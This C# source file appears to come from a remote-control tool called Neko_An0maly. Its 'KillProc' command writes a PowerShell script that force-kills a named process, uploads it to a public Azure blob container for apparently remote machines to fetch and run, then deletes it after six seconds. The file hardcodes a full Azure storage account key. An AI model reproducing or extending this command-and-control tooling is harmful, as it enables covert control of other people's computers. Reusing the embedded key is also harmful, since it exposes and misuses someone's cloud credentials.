using System;
using System.IO;
using System.Text;
using System.Threading;
using Microsoft.WindowsAzure.Storage;
using Microsoft.WindowsAzure.Storage.Blob;

namespace Neko_An0maly.Commands
{
    public class KillProc : Command
    {
        public static string path = @"C:\ProgramData\";

        public KillProc(string name):base(name) { }

        public override string execute(string[] args)
        {
            if(args.Length == 2)
            {
                Console.WriteLine("Initializing command to be sent.");

                string fileName = args[0] + ".ps1";
                string finalPath = path + fileName;
                using (FileStream fs = File.Create(finalPath))
                {
                    Byte[] line1 = new UTF8Encoding(true).GetBytes("Stop-Process -Name " + (char)34 + args[1] + (char)34 + " -Force");
                    fs.Write(line1, 0, line1.Length);
                }

                Console.WriteLine("Initializing upload.");

                upload(finalPath);

                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("Process Completed!");
                Console.ForegroundColor = ConsoleColor.White;

                return "";
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Invalid arguments for 'killproc'. Requires 2 argument(s).");
                Console.ForegroundColor = ConsoleColor.White;
                return "";
            }
        }

        public void upload(string fileToUpload)
        {
            string file_extension,
            filename_withExtension,
            storageAccount_connectionString;
            Stream file;
            string azure_ContainerName = "ftp";

            storageAccount_connectionString = "DefaultEndpointsProtocol=https;AccountName=previewps;AccountKey=Io326GO+TGJpd8yBh1LzSDDRc6vdWV81O6Ntkc/SJOYHe4NA6IlxUOPrJjycEM8uAEWZu2XkZ5LUDTymfRGIsw==;EndpointSuffix=core.windows.net"; ;

            file = new FileStream(fileToUpload, FileMode.Open);

            CloudStorageAccount mycloudStorageAccount = CloudStorageAccount.Parse(storageAccount_connectionString);
            CloudBlobClient blobClient = mycloudStorageAccount.CreateCloudBlobClient();
            CloudBlobContainer container = blobClient.GetContainerReference(azure_ContainerName);

            if (container.CreateIfNotExists())
            {

                container.SetPermissionsAsync(new BlobContainerPermissions
                {
                    PublicAccess =
                  BlobContainerPublicAccessType.Blob
                });

            }

            file_extension = Path.GetExtension(fileToUpload);
            filename_withExtension = Path.GetFileName(fileToUpload);

            CloudBlockBlob cloudBlockBlob = container.GetBlockBlobReference(filename_withExtension);
            cloudBlockBlob.Properties.ContentType = file_extension;

            cloudBlockBlob.UploadFromStreamAsync(file);

            Console.WriteLine("Upload Completed.");
            Console.WriteLine("Thread sleeping for 6s.");

            Thread.Sleep(6000);

            Console.WriteLine("Deleting command to prevent looping.");
            cloudBlockBlob.DeleteIfExists();
            file.Dispose();
        }
    }
}
